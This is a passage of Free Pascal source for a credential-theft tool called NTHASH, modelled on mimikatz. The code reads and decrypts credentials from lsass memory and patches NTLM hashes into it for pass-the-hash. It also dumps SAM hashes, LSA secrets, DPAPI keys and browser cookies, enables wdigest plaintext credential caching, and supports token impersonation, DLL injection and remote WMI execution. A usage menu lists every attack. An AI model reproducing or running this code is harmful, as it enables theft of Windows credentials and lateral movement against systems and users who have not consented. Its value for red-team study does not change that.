                                          //log('sha1:'+ByteToHexaString(PCRED_NTLM_BLOCK(@decrypted[0]).sha1) ,1);
                                          {$endif CPU32}
                                          //PTH time ! lets modify the crendential buffer and write it back to mem
                                          if (luid<>0) and (hash<>'') then
                                          begin
                                          {$ifdef CPU64}
                                          if (pos('-1903',winver)>0) or (pos('-1803',winver)>0) or (pos('-1703',winver)>0) or
                                             (pos('-1909',winver)>0) or (pos('-1809',winver)>0) or (pos('-1709',winver)>0) or
                                             (pos('-2004',winver)>0)
                                             then PCRED_NTLM_BLOCK_1903(@decrypted[0]).ntlmhash:=HexaStringToByte(hash)
                                             else PCRED_NTLM_BLOCK(@decrypted[0]).ntlmhash:=HexaStringToByte(hash);
                                          {$endif CPU64}
                                          {$ifdef CPU32}
                                          PCRED_NTLM_BLOCK(@decrypted[0]).unk4 :=HexaStringToByte(hash);
                                          {$endif CPU32}
                                          encryptLSA(PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).Credentials.Length,decrypted,output);
                                          if writemem(hprocess,nativeuint(PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).Credentials.Buffer),@output[0],PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).Credentials.Length)
                                             then log('PTH OK',1)
                                             else log('PTH NOT OK',1);
                                          end;//if luid<>0 then
                                          end;
                                       if PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).len=14 then
                                          begin
                                          log('->CredentialKeys',1);
                                          log('ntlm:'+ByteToHexaString(Pcredentialkeys(@decrypted[0]).ntlmhash) ,1);
                                          log('sha1:'+ByteToHexaString(Pcredentialkeys(@decrypted[0]).sha1) ,1);
                                          end;
                                       end;
                       end;//if PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).Credentials.Length>0 then
                     if credentials=0 then break;
                     ReadMem  (hprocess,credentials,bytes );
                     end; //while nativeuint(PKIWI_MSV1_0_CREDENTIALS(@bytes[0]).next)<>0 do
                     end;//if nativeuint(_KIWI_MSV1_0_LIST_63 (logsesslist ).Credentials)<>0 then
                     end; // if (luid=0) or ...
                   //next logsesslist
                   current:=nativeuint(_KIWI_MSV1_0_LIST_63 (logsesslist ).flink);
                   ReadMem  (hprocess,_KIWI_MSV1_0_LIST_63 (logsesslist ).flink,logsesslist );
                   //dummy:=inttohex(_KIWI_MSV1_0_LIST_63 (logsesslist ).flink,sizeof(pointer));
                   end; //while ...




                            {//test - lets read first 4 bytes of our module
                             //can be verified with process hacker
                            if ReadProcessMemory( hprocess,addr,@buffer[0],4,@read) then
                               begin
                               log('ReadProcessMemory OK');
                               log(inttohex(buffer[0],1)+inttohex(buffer[1],1)+inttohex(buffer[2],1)+inttohex(buffer[3],1));
                               end;
                            }
       closehandle(hprocess);
       end;//if openprocess...

end;



function createprocessaspid(ApplicationName: string;pid:string     ):boolean;
var
  StartupInfo: TStartupInfoW;
  ProcessInformation: TProcessInformation;
  i:byte;
begin
ZeroMemory(@StartupInfo, SizeOf(TStartupInfoW));
  FillChar(StartupInfo, SizeOf(TStartupInfoW), 0);
  StartupInfo.cb := SizeOf(TStartupInfoW);
  StartupInfo.lpDesktop := 'WinSta0\Default';
  for i:=4 downto 0 do
    begin
    result:= CreateProcessAsSystemW_Vista(PWideChar(WideString(ApplicationName)),PWideChar(WideString('')),NORMAL_PRIORITY_CLASS,
    nil,pwidechar(widestring(GetCurrentDir)),
    StartupInfo,ProcessInformation,
    TIntegrityLevel(i),
    strtoint(pid ));
    if result then
       begin
       log('pid:'+inttostr(ProcessInformation.dwProcessId )+' integrity:'+inttostr(i));
       exit;
       end;
    end; //for i:=3 downto 0 do
  log('createprocessaspid failed,'+inttostr(getlasterror),1)
end;



function callback_LogonPasswords(param:pointer=nil):dword;stdcall;
var
  credentials:nativeuint;
begin
  //example
  log('!LUID:'+inttohex(PKIWI_MSV1_0_LIST_63(param).LocallyUniqueIdentifier.LowPart,sizeof(dword))) ;

end;

function pth(username,hash,domain:string):boolean;
const
  LOGON_WITH_PROFILE=1;
  LOGON_NETCREDENTIALS_ONLY=2;
  //
  CREATE_NEW_CONSOLE=$10;
  CREATE_SUSPENDED=$4;

var
si           : TStartupInfoW;
pi          : TProcessInformation;
bret:bool;
token:thandle;
len:dword;
stats:TOKEN_STATISTICS ;
begin
  //createprocesswithlogon suspended
  ZeroMemory(@si, sizeof(si));
  ZeroMemory(@pi, sizeof(pi));
  si.cb := sizeof(si);
  si.dwFlags := STARTF_USESHOWWINDOW;
  si.wShowWindow := 1;
  bret:=CreateProcessWithLogonW(pwidechar(widestring(user)),pwidechar(widestring(domain)),pwidechar(widestring('')),LOGON_NETCREDENTIALS_ONLY,nil,pwidechar(sysdir+'\cmd.exe'),CREATE_NEW_CONSOLE or CREATE_SUSPENDED ,nil,nil,@SI,@PI);
  if bret=false then writeln('failed: '+inttostr(getlasterror));

  if bret=true then
     begin
     //OpenProcessToken / GetTokenInformation +tokenstatistics to get LogonSession LUID
     fillchar(stats,sizeof(stats),0);
     if OpenProcesstoken(pi.hProcess ,TOKEN_READ,token)= true
        then if GetTokenInformation(token,tokenstatistics,@stats,sizeof(stats),len)
           then writeln('LUID:'+inttohex(stats.AuthenticationId,sizeof(stats.AuthenticationId)));
     writeln('PID:'+inttostr(pi.dwProcessId) );
    if stats.AuthenticationId<>0 then
    begin
    //cycle thru logonsessions to match the luid
    //patch the credentialblob to stuff the ntlm hash (encrypted with encryptlsa)
    findlsakeys (lsass_pid,deskey,aeskey,iv );
    logonpasswords (lsass_pid ,stats.AuthenticationId,hash); //put your hash here
    //and finally resume...
    ResumeThread(pi.hThread );
    end // if stats.AuthenticationId<>0 then
    else upsapi._killproc(pi.dwProcessId);
    end; //if bret=true then
end;

function EncodeStringBase64w(const s:widestring):wideString;

var
  Outstream : TStringStream;
  Encoder   : TBase64EncodingStream;
begin
  Outstream:=TStringStream.Create('');
  try
    Encoder:=TBase64EncodingStream.create(outstream);
    try
      Encoder.Write(s[1],Length(s)*2);
    finally
      Encoder.Free;
      end;
    Result:=Outstream.DataString;
  finally
    Outstream.free;
    end;
end;

function DecodeStringBase64w(const s:widestring;strict:boolean=false):wideString;

var
  Instream,
  Outstream : TStringStream;
  Decoder   : TBase64DecodingStream;
begin
  Instream:=TStringStream.Create(s);
  try
    Outstream:=TStringStream.Create('');
    try
      if strict then
        Decoder:=TBase64DecodingStream.Create(Instream,bdmStrict)
      else
        Decoder:=TBase64DecodingStream.Create(Instream,bdmMIME);
      try
         Outstream.CopyFrom(Decoder,Decoder.Size);
         Result:=Outstream.DataString;
      finally
        Decoder.Free;
        end;
    finally
     Outstream.Free;
     end;
  finally
    Instream.Free;
    end;
end;






begin
  console_output_type:=GetFileType(GetStdHandle(STD_OUTPUT_HANDLE));
  consolecp:=GetConsoleCP ; //in case you want alter/restore the console codepage
  //
  //FILE_TYPE_DISK : to a file
  //FILE_TYPE_CHAR : to output console
  //FILE_TYPE_PIPE : to a pipe
  //
  if console_output_type<>FILE_TYPE_PIPE then
    log('NTHASH 1.8 '+{$ifdef CPU64}'x64'{$endif cpu64}{$ifdef CPU32}'x32'{$endif cpu32}+' by erwan2212@gmail.com',1);
  winver:=GetWindowsVer;
  osarch:=getenv('PROCESSOR_ARCHITECTURE');
  getmem(sysdir,Max_Path );
  GetSystemDirectory(sysdir, MAX_PATH - 1);
  debugpriv:=EnableDebugPriv('SeDebugPrivilege');
  lsass_pid:=upsapi._EnumProc2('lsass.exe');
  //
  //writeln(length(string('test')));
  //writeln(length(widestring('test')));
  //exit;
  //
  if ((paramcount=1) and (pos('/context',cmdline)>0)) then
  begin
  log('Windows Version:'+winver,1);
  //log('SystemDirectory:'+sysdir,1);
  log('Architecture:'+osarch,1);
  log('Username:'+GetCurrUserName,1);
  //log('IsAdministrator:'+BoolToStr (IsAdministrator),1);
  log('IsAdministratorAccount:'+BoolToStr (IsAdministratorAccount,true),1);
  log('IsElevated:'+BoolToStr (IsElevated,true),1);
  log('DebugPrivilege:'+BoolToStr (debugpriv,true),1);
  log('LSASS PID:'+inttostr(lsass_pid ),1);

  end;
  //
  //RunElevated('');
  //
  if (paramcount=0) or ((paramcount=1) and (pos('/wait',cmdline)>0)) then
  begin
  log('NTHASH /setntlm [/server:hostname] /user:username /newhash:xxx',1);
  log('NTHASH /setntlm [/server:hostname] /user:username /newpwd:xxx',1);
  log('NTHASH /changentlm [/server:hostname] /user:username /oldpwd:xxx /newpwd:xxx',1);
  log('NTHASH /changentlm [/server:hostname] /user:username /oldhash:xxx /newpwd:xxx',1);
  log('NTHASH /changentlm [/server:hostname] /user:username /oldpwd:xxx /newhash:xxx',1);
  log('NTHASH /changentlm [/server:hostname] /user:username /oldhash:xxx /newhash:xxx',1);
  log('NTHASH /getntlmhash /input:password',1);
  //*******************************************
  log('NTHASH /getsid /user:username [/server:hostname]',1);
  log('NTHASH /getsids [/server:hostname] [/offline]',1);
  log('NTHASH /getusers [/server:hostname]',1);
  log('NTHASH /getdomains [/server:hostname]',1);
  log('NTHASH /dumpsam',1);
  log('NTHASH /dumphashes [/offline]',1);
  log('NTHASH /dumphash /rid:500 [/offline]',1); //will patch lsasss
  log('NTHASH /getsyskey [/offline]',1);
  log('NTHASH /getsamkey [/offline]',1);
  log('NTHASH /dumpsecret /input:* [/offline]',1);
  log('NTHASH /dumpsecret /input:a_secret [/offline]',1);
  log('NTHASH /dumpsecret /input:dpapi_system [/offline]',1);
  log('NTHASH /getlsakeys [/symbol]',1); //will read mem
  log('NTHASH /wdigest [/symbol]',1);  //will read mem
  log('NTHASH /wdigeston [/symbol]',1);  //will read mem
  log('NTHASH /logonpasswords [/symbol]',1); //will read mem
  log('NTHASH /pth /user:username /password:myhash /domain:mydomain',1); //will patch lsass
  log('NTHASH /enumcred',1);
  log('NTHASH /enumcred2',1); //will patch lsass
  log('NTHASH /enumvault',1);
  //***************************************************
  log('NTHASH /chrome [/binary:path_to_database] [/input:hexastring]',1);
  log('NTHASH /ccookies [/binary:path_to_database]',1);
  log('NTHASH /firefox [/binary:path_to_database]',1);
  log('NTHASH /fcookies [/binary:path_to_database]',1);
  //****************************************************
  log('NTHASH /hexatostring /input:hexastring',1);
  log('NTHASH /stringtohexa /input:string',1);
  log('NTHASH /filetohexa /binary:filename',1);
  log('NTHASH /hexatofile /input:hexastring',1);
  log('NTHASH /widestringtobyte /input:string',1);
  log('NTHASH /base64encodew /input:string',1);
  log('NTHASH /base64encode /input:string',1);
  log('NTHASH /base64encodehexa /input:hexastring',1);
  log('NTHASH /base64decode /input:base64string',1);
  log('NTHASH /base64decodehexa /input:base64string',1);
  //****************************************************
  log('NTHASH /dpapimk [/symbol]',1);  //will read mem
  log('NTHASH /cryptunprotectdata /binary:filename [/hexa]',1);
  log('NTHASH /cryptunprotectdata /input:hexastring [/hexa]',1);
  log('NTHASH /cryptprotectdata /input:string [mode:MACHINE]',1);
  log('NTHASH /decodeblob /binary:filename [/input:hexastring]',1);
  log('NTHASH /decodemk /binary:filename [/input:hmachexastring] [/password:sha1pwdhexastring]',1);
  log('NTHASH /wlansvc /binary:filename',1);
  log('NTHASH /gethash /mode:hashid /input:hexastring',1);
  log('NTHASH /gethmac /mode:hashid /input:hexastring /key:hexastring',1);
  log('NTHASH /getcipher /mode:cipherid /input:hexastring /key:hexastring',1);
  log('NTHASH /getlsasecret /input:secret [/server:hostname]',1);
  log('NTHASH /getlsasecret /input:dpapi_system [/server:hostname]',1);
  //log('NTHASH /dpapi_system',1);
  //****************************************************
  log('NTHASH /runasuser /user:username /password:password [/binary:x:\folder\bin.exe]',1);
  log('NTHASH /runastoken /pid:12345 [/binary:x:\folder\bin.exe]',1);
  log('NTHASH /runaschild /pid:12345 [/binary:x:\folder\bin.exe]',1);
  log('NTHASH /runas [/binary:x:\folder\bin.exe]',1);
  log('NTHASH /runts /user:session_id [/binary:x:\folder\bin.exe]',1);
  //log('NTHASH /enumts [/server:hostname]',1);
  log('NTHASH /enumpriv',1);
  log('NTHASH /enumproc',1);
  //log('NTHASH /killproc /pid:12345',1);
  log('NTHASH /enummod /pid:12345',1);
  log('NTHASH /dumpproc /pid:12345',1);
  //**************************************
  log('NTHASH /inject /pid:12345 /binary:x:\folder\bin.dll',1);
  log('NTHASH /eject /pid:12345 /binary:bin.dll',1);
  //**************************************
  //log('NTHASH /enumprocwmi [/server:hostname]',1);
  //log('NTHASH /killprocwmi /pid:12345 [/server:hostname]',1);
  //log('NTHASH /runwmi /binary:x:\folder\bin.exe [/server:hostname] [/user:username] [/password:password]',1);
  log('NTHASH /runwmi /binary:x:\folder\bin.exe [/server:hostname]',1);
  //log('NTHASH /dirwmi /input:path [/server:hostname]',1);
  //***************************************
  log('NTHASH /context',1);
  log('NTHASH /a_command /verbose',1);
  log('NTHASH /a_command /system',1);
  end;
  //
  p:=pos('/system',cmdline);
  if p>0 then
     begin
     if impersonatepid (lsass_pid)
        then log('Impersonate:'+GetCurrUserName,1)
        else log('impersonatepid NOT OK',1);
     end;
  p:=pos('/symbol',cmdline);
  if p>0 then symmode :=true;
  p:=pos('/verbose',cmdline);
  if p>0 then verbose:=true;
  p:=pos('/offline',cmdline);
  if p>0 then
     begin
     usamutils.offline :=true;
     if console_output_type<>FILE_TYPE_PIPE then log('Offline=true',1);
     if (not FileExists ('sam.sav')) or (not FileExists ('system.sav')) then
        begin
        log('sam.sav and/or system.sav and/or security.sav missing',1);
        //goto fin;
        end;
     end;
  //any input?
  inhandle := GetStdHandle(STD_INPUT_HANDLE);
  if GetFileType(inhandle) <> FILE_TYPE_CHAR then
     begin
     //writeln('echo in');
     p:=512;
     setlength(input_,p);
     ZeroMemory(@input_[0],p);
     input:='';
     dw:=0;
     while Readfile(inhandle,input_[0],p,dw ,nil) =true do
        begin
        //log('dw:'+inttostr(dw));
        if dw=0 then exit;
        input:=input+strpas(pchar(@input_[0]));
        ZeroMemory(@input_[0],p);
        end;
     //in some situations, the input ends with CRLF in which case we will remove it
     if (input[length(input)-1]=#13) and (input[length(input)]=#10) then delete(input,length(input)-1,2) ;
     //writeln('.'+input+'.');
     log('input length:'+inttostr(length(input)));
     //exit;
     end;
  //
  //enum_samusers(samkey);
  {
  password:='Passwordxxx';
  setlength(buffer,length(password));
  Move(password[1], buffer[0], Length(password));
  if CryptProtectData_ (buffer,'test.bin')=false then writeln('false');
  if CryptUnProtectData_(buffer,'test.bin')=false
     then writeln('false')
     else writeln(BytetoAnsiString (buffer));
  //writeln(BytetoAnsiString (buffer)+'.');
  }
  //wdigest_on (lsass_pid );
  //writeln(sizeof(_LSA_UNICODE_STRING));
  //exit;
  {
  master key=  ('43A1899600562CE62D7481622A49D19D2FAE7640794C3F3A8238BE3CB627F7EB'),
  iv=   ('AF62B9200C99BC02774738BF'),
  encrypted data =   ('12CC7D67B22B4160BE6D47FBB4D1DD71C5109DA857C640B15C4DC344'),
  tag = B4D1DD71C5109DA857C640B15C4DC344
  //https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/dpapi/packages/kuhl_m_dpapi_chrome.c
  setlength(output_,12); //length of encrypted - 16
  bdecrypt_gcm('AES', //AES-GMAC
     HexaStringToByte2 ('12CC7D67B22B4160BE6D47FBB4D1DD71C5109DA857C640B15C4DC344'),
     @output_[0],
     HexaStringToByte2 ('43A1899600562CE62D7481622A49D19D2FAE7640794C3F3A8238BE3CB627F7EB'),
     HexaStringToByte2 ('AF62B9200C99BC02774738BF'));
  log('decrypted:'+BytetoAnsiString  (output_));
  exit;
  }
  //
  p:=pos('/server:',cmdline);
  if p>0 then
       begin
       server:=copy(cmdline,p,255);
       server:=stringreplace(server,'/server:','',[rfReplaceAll, rfIgnoreCase]);
       delete(server,pos(' ',server),255);
       //log(server);
       end;
  p:=pos('/user:',cmdline);
      if p>0 then
           begin
           user:=copy(cmdline,p,255);
           user:=stringreplace(user,'/user:','',[rfReplaceAll, rfIgnoreCase]);
           delete(user,pos(' ',user),255);
           //log(user);
           end;
  p:=pos('/password:',cmdline);
  if p>0 then
       begin
       password:=copy(cmdline,p,512);
       password:=stringreplace(password,'/password:','',[rfReplaceAll, rfIgnoreCase]);
       delete(password,pos(' ',password),512);
       //log(user);
       end;
  p:=pos('/domain:',cmdline);
  if p>0 then
       begin
       domain:=copy(cmdline,p,255);
       domain:=stringreplace(domain,'/domain:','',[rfReplaceAll, rfIgnoreCase]);
       delete(domain,pos(' ',domain),255);
       //log(domain);
       end;
  p:=pos('/pid:',cmdline);
  if p>0 then
       begin
       pid:=copy(cmdline,p,255);
       pid:=stringreplace(pid,'/pid:','',[rfReplaceAll, rfIgnoreCase]);
       delete(pid,pos(' ',pid),255);
       end;
  p:=pos('/rid:',cmdline);
  if p>0 then
       begin
       rid:=copy(cmdline,p,255);
       rid:=stringreplace(rid,'/rid:','',[rfReplaceAll, rfIgnoreCase]);
       delete(rid,pos(' ',rid),255);
       end;
  p:=pos('/binary:',cmdline);
  if p>0 then
       begin
       binary:=copy(cmdline,p,1024); //length(cmdline)-p
       binary:=stringreplace(binary,'/binary:','',[rfReplaceAll, rfIgnoreCase]);
       //delete(binary,pos(' ',binary),255);
       delete(binary,pos('/',binary),1024);
       binary:=trim(binary);
       //

       end;
  p:=pos('/input:',cmdline);
  if p>0 then
       begin
       input:=copy(cmdline,p,2048);
       input:=stringreplace(input,'/input:','',[rfReplaceAll, rfIgnoreCase]);
       //delete(input,pos(' ',input),2048);
       delete(input,pos(' /',input),2048);
       input:=trim(input);
       end;
  p:=pos('/mode:',cmdline);
  if p>0 then
       begin
       mode:=copy(cmdline,p,255);
       mode:=stringreplace(mode,'/mode:','',[rfReplaceAll, rfIgnoreCase]);
       delete(mode,pos(' ',mode),255);
       end;
  p:=pos('/key:',cmdline);
  if p>0 then
       begin
       key:=copy(cmdline,p,512);
       key:=stringreplace(key,'/key:','',[rfReplaceAll, rfIgnoreCase]);
       delete(key,pos(' ',key),512);
       end;
  p:=pos('/oldhash:',cmdline);
  if p>0 then
       begin
       oldhash:=copy(cmdline,p,255);
       oldhash:=stringreplace(oldhash,'/oldhash:','',[rfReplaceAll, rfIgnoreCase]);
       delete(oldhash,pos(' ',oldhash),255);
       //log(oldhash);
       end;
  p:=pos('/newhash:',cmdline);
  if p>0 then
       begin
       newhash:=copy(cmdline,p,255);
       newhash:=stringreplace(newhash,'/newhash:','',[rfReplaceAll, rfIgnoreCase]);
       delete(newhash,pos(' ',newhash),255);
       //log(newhash);
       end;
  p:=pos('/oldpwd:',cmdline);
  if p>0 then
       begin
       oldpwd:=copy(cmdline,p,255);
       oldpwd:=stringreplace(oldpwd,'/oldpwd:','',[rfReplaceAll, rfIgnoreCase]);
       delete(oldpwd,pos(' ',oldpwd),255);
       //log(oldpwd);
       end;
  p:=pos('/newpwd:',cmdline);
  if p>0 then
       begin
       newpwd:=copy(cmdline,p,255);
       newpwd:=stringreplace(newpwd,'/newpwd:','',[rfReplaceAll, rfIgnoreCase]);
       delete(newpwd,pos(' ',newpwd),255);
       //log(newpwd);
       end;
//***************************************************************************
//*********************** end of input parameters ***************************
//***************************************************************************
p:=pos('/enumcred2',cmdline);
if p>0 then
 begin
 //uvaults.VaultInit ;
 uvaults.patch_CredpCloneCredential (lsass_pid ); //calling enumvault seems to bring back an encrypted blob
 goto fin;
 end;
  p:=pos('/enumvault',cmdline);
if p>0 then
   begin
   uvaults.VaultInit ;
   uvaults.Vaultenum ;
   goto fin;
   end;
p:=pos('/enumcred',cmdline);
if p>0 then
   begin
     try
     if CredEnum=true then log('enumcred OK',1) else log('enumcred NOT OK',1);
     except
     on e:exception do log(e.message);
     end;
     goto fin;
   end;
p:=pos('/getlsakeys',cmdline);
if p>0 then
   begin
   if findlsakeys (lsass_pid,deskey,aeskey,iv ) then
      begin
      log('IV:'+ByteToHexaString (iv),1);
      log('DESKey:'+ByteToHexaString (deskey),1);
      log('AESKey:'+ByteToHexaString (aeskey),1);
      end
      else log('findlsakeys failed',1);
   goto fin;
   end;
p:=pos('/dpapimk',cmdline);
if p>0 then
   begin
   if findlsakeys (lsass_pid,deskey,aeskey,iv )=false then begin log('findlsakeys failed',1);exit; end;
   dpapi (lsass_pid );
   goto fin;
   end;
p:=pos('/logonpasswords',cmdline);
if p>0 then
   begin
   if findlsakeys (lsass_pid,deskey,aeskey,iv )=true
      then logonpasswords (lsass_pid )
      else log('findlsakeys failed',1);
   //logonpasswords (lsass_pid,0,'',@callback_LogonPasswords );

   goto fin;
   end;
p:=pos('/wdigeston2',cmdline); //disable credguard within wdigest
if p>0 then
   begin
   //symmode :=true;;
   if wdigest_disableCredGuard  (lsass_pid )
     then log('wdigest_disableCredGuard OK',1)
     else log('wdigest_disableCredGuard NOT OK',1);
   exit;
   end;
p:=pos('/wdigeston',cmdline); //enable uselogoncredential within wdigest
if p>0 then
   begin
   //symmode :=true;;
   if wdigest_UseLogonCredential  (lsass_pid )
     then log('wdigest_UseLogonCredential OK',1)
     else log('wdigest_UseLogonCredential NOT OK',1);
   exit;
   end;
p:=pos('/wdigest',cmdline);
if p>0 then
   begin
   if findlsakeys (lsass_pid,deskey,aeskey,iv )=true
      then wdigest (lsass_pid)
      else log('findlsakeys failed',1);
   goto fin;
   end;
p:=pos('/enumpriv',cmdline);
if p>0 then
   begin
   if enumprivileges=false then writeln('enumprivileges NOT OK');
   goto fin;
   end;
//************* ENCODE/DECODE ***********************************************
  //FiletoHexaString ('data.blob');
  p:=pos('/filetohexa',cmdline);
    if p>0 then
       begin
       if (binary='') and FileExists ('data.blob') then binary:='data.blob';
       if binary='' then exit;
       if console_output_type<>FILE_TYPE_PIPE then log('filetohexa',1);
       if console_output_type<>FILE_TYPE_PIPE then log('filename:'+extractfilename(binary),1);
       if not FiletoHexaString(binary)
          then log('not ok',1);
       goto fin;
       end;
  p:=pos('/hexatofile',cmdline);
    if p>0 then
       begin
       if input='' then exit;
       if (binary='') {and FileExists ('data.blob')} then binary:='data.blob';
       if binary='' then exit;
       if console_output_type<>FILE_TYPE_PIPE then log('hexatofile',1);
       if console_output_type<>FILE_TYPE_PIPE then log('filename:'+extractfilename(binary),1);
       if HexaStringToFile (binary,HexaStringToByte2(input))
          then log(extractfilename(binary)+' written',1) else log('not ok',1);
       goto fin;
       end;
  p:=pos('/hexatostring',cmdline);
  if p>0 then
     begin
     if input='' then exit;
     //log('BytetoString:'+BytetoAnsiString (HexaStringToByte (input)),1);
     if console_output_type<>FILE_TYPE_PIPE then log('hexatostring',1);
     log(BytetoAnsiString (HexaStringToByte (input)),1);
     goto fin;
     end;
  p:=pos('/stringtohexa',cmdline);
  if p>0 then
     begin
     if input='' then exit;
     //log('StringtoByte:'+ ByteToHexaString ( AnsiStringtoByte(input)),1);
     if console_output_type<>FILE_TYPE_PIPE then log('stringtohexa',1);
     log(ByteToHexaString ( AnsiStringtoByte(input)),1);
     goto fin;
     end;
  p:=pos('/widestringtohexa',cmdline);
  if p>0 then
     begin
     if input='' then exit;
     //log('widestringtobyte:'+ ByteToHexaString ( AnsiStringtoByte(input,true)),1);
     if console_output_type<>FILE_TYPE_PIPE then log('widestringtohexa',1);
     log(ByteToHexaString ( AnsiStringtoByte(input,true)),1);
     goto fin;
     end;
  p:=pos('/base64encodew',cmdline);
  if p>0 then
     begin
     if input='' then exit;
     input:=StringReplace (input,'%2f','/',[rfReplaceAll,rfIgnoreCase]);
     //writeln('input:'+input);
     if console_output_type<>FILE_TYPE_PIPE then log('base64encodew',1);
     log(EncodeStringBase64w (widestring(input)) ,1);
     goto fin;
     end;
  p:=pos('/base64encodehexa',cmdline);
  if p>0 then
     begin
     if input='' then exit;
     //input:=StringReplace (input,'%2f','/',[rfReplaceAll,rfIgnoreCase]);
     //writeln('input:'+input);
     if console_output_type<>FILE_TYPE_PIPE then log('base64encodehexa',1);
     log(base64.EncodeStringBase64 (BytetoAnsiString (HexaStringToByte2 (input))) ,1);
     goto fin;
     end;
  p:=pos('/base64encode',cmdline);
  if p>0 then
     begin
     if input='' then exit;
     input:=StringReplace (input,'%2f','/',[rfReplaceAll,rfIgnoreCase]);
     //writeln('input:'+input);
     if console_output_type<>FILE_TYPE_PIPE then log('base64encode',1);
     log(base64.EncodeStringBase64 ((input)) ,1);
     goto fin;
     end;
  {
  p:=pos('/base64decodew',cmdline);
  if p>0 then
     begin
     if input='' then exit;
     log('base64decodew:'+ DecodeStringBase64w (widestring(input)) ,1);
     goto fin;
     end;
  }
  p:=pos('/base64decodehexa',cmdline);
  if p>0 then
     begin
     if input='' then exit;
     //log(inttostr(length(input)));
     if console_output_type<>FILE_TYPE_PIPE then log('base64decodehexa',1);
     log(ByteToHexaString (AnsiStringtoByte (base64.DecodeStringBase64 (input))) ,1);
     goto fin;
     end;
  p:=pos('/base64decode',cmdline);
  if p>0 then
     begin
     if input='' then exit;
     if console_output_type<>FILE_TYPE_PIPE then log('base64decode',1);
     //SetConsoleOutputCP(437  );
     log(base64.DecodeStringBase64 (input) ,1);
     //SetConsoleOutputCP(consolecp);
     goto fin;
     end;
  //************************************************************
  p:=pos('/getsyskey',cmdline);
  if p>0 then
     begin
     if getsyskey(syskey)
        then log('Syskey:'+ByteToHexaString(syskey) ,1)
        else log('getsyskey NOT OK' ,1);
     goto fin;
     end;
  p:=pos('/getsamkey',cmdline);
  if p>0 then
     begin
     if getsyskey(syskey) then
        begin
        log('SYSKey:'+ByteToHexaString(SYSKey) ,1);
        if getsamkey(syskey,samkey,server)
           then log('SAMKey:'+ByteToHexaString(samkey) ,1)
           else log('getsamkey NOT OK, try adding /system' ,1);
        end //if getsyskey(syskey) then
        else log('getsyskey NOT OK' ,1);
     goto fin;
     end;
  p:=pos('/dumphashes',cmdline);
  if p>0 then
     begin
     if getsyskey(syskey) then
        begin
        log('SYSKey:'+ByteToHexaString(SYSKey) ,1);
        if getsamkey(syskey,samkey)
           then
              begin
              log('SAMKey:'+ByteToHexaString(samkey) ,1);
              query_samusers (samkey,@callback_SamUsers );
              end //if getsamkey(syskey,samkey)
           else log('getsamkey NOT OK, try adding /system' ,1);
        end //if getsyskey(syskey) then
        else log('getsyskey NOT OK' ,1);
     goto fin;
     end;
  p:=pos('/dumphash',cmdline);
  if p>0 then
     begin
     if rid='' then goto fin;
     if getsyskey(syskey) then
        begin
        log('SYSKey:'+ByteToHexaString(SYSKey) ,1);
        if getsamkey(syskey,samkey)
           then
              begin
              log('SAMKey:'+ByteToHexaString(samkey) ,1);
              if dumphash(samkey,strtoint(rid),ntlmhash,user)
                 then log('NTHASH:'+user+':'+rid+'::'+ByteToHexaString(ntlmhash) ,1)
                 else log('dumphash NOT OK' ,1);
              end //if getsamkey(syskey,samkey)
           else log('getsamkey NOT OK' ,1);
        end //if getsyskey(syskey) then
        else log('getsyskey NOT OK' ,1);
     goto fin;
     end;
//******************* WMI **********************
  p:=pos('/enumprocwmi',cmdline); //can be done with wmic
    if p>0 then
       begin
       uwmi._EnumProc (server);
       goto fin;
       end;
    p:=pos('/runwmi',cmdline); //can be done with wmic but escaping chars is a PITA
      if p>0 then
         begin
         if binary='' then exit;
         binary:=StringReplace (binary,'%2f','/',[rfReplaceAll,rfIgnoreCase]);
         uwmi._Create (server,binary,user,password);
         goto fin;
         end;
    p:=pos('/killprocwmi',cmdline);  //can be done with wmic
        if p>0 then
           begin
           if pid='' then exit;
           if not TryStrToInt (pid,_long ) then begin log('invalid pid',1);exit;end;
           uwmi._Killproc  (server,strtoint(pid));
           goto fin;
           end;
   p:=pos('/dirwmi',cmdline);  //can be done with wmic
            if p>0 then
               begin
               if input='' then exit;
               uwmi._ListFolder(server,'','',input );
               goto fin;
               end;
   {
   p:=pos('/copywmi',cmdline);  //can be done with wmic
             if p>0 then
             begin
             //if input='' then exit;
             //uwmi._CopyFile(server,'\\192.168.1.248\public\nc.exe','c:\temp\nc.exe') ;
             goto fin;
             end;
   }
//*********TS**************************

p:=pos('/enumts',cmdline); //can be done with taskkill
  if p>0 then
     begin
     ret:= wtssessions(server,sessions);
         if ret=0 then
            begin
            for dw:=low(sessions) to high(sessions) do
                begin
                with sessions[dw] do
                begin
                writeln(WTSSessionid +#9+ WTSWinStationName+#9+WTSState+#9+WTSUserName+#9+WinstaLogonTime+#9+WinstaIdleTime );
                end; //with
                end;//for dw:=low(sessions) to high(sessions) do
            end; //if ret=0 then
       if ret>0 then writeln(inttostr(ret)+','+inttostr(getlasterror));
     goto fin;
     end;

//*********PROCESS ********************
  p:=pos('/enumproc',cmdline); //can be done with taskkill
    if p>0 then
       begin
       //writeln('.'+trim(input)+'.');
       dw:=upsapi._EnumProc2(trim(input),true) ;
       if dw<>0 then log(inttostr(dw),1);
       {
       dw:=upsapi._EnumProc(trim(input));
       if dw<>0 then log(inttostr(dw),1);
       }
       goto fin;
       end;
    p:=pos('/enummod',cmdline);  ////can be done with taskkill
    if p>0 then
       begin
       if TryStrToInt (input,_long ) then pid:=input;
       if pid='' then exit;
       if not TryStrToInt (pid,_long ) then begin log('invalid pid',1);exit;end;
       _EnumMod(strtoint(pid),'');
       goto fin;
       end;
  p:=pos('/dumpproc',cmdline);
  if p>0 then
     begin
     if TryStrToInt (input,_long ) then pid:=input;
     if pid='' then exit;
     if not TryStrToInt (pid,_long ) then begin log('invalid pid',1);exit;end;
     if dumpprocess (strtoint(pid)) then log('OK',1) else log('NOT OK',1);
     goto fin;
     end;
  p:=pos('/killproc',cmdline);  ////can be done with taskkill
  if p>0 then
     begin
     if TryStrToInt (input,_long ) then pid:=input;
     if pid='' then exit;
     if not TryStrToInt (pid,_long ) then begin log('invalid pid',1);exit;end;
     if upsapi._killproc(strtoint(pid)) then log('OK',1) else log('NOT OK',1);
     goto fin;
     end;
  //********************************************
  p:=pos('/inject',cmdline);  //
  if p>0 then
     begin
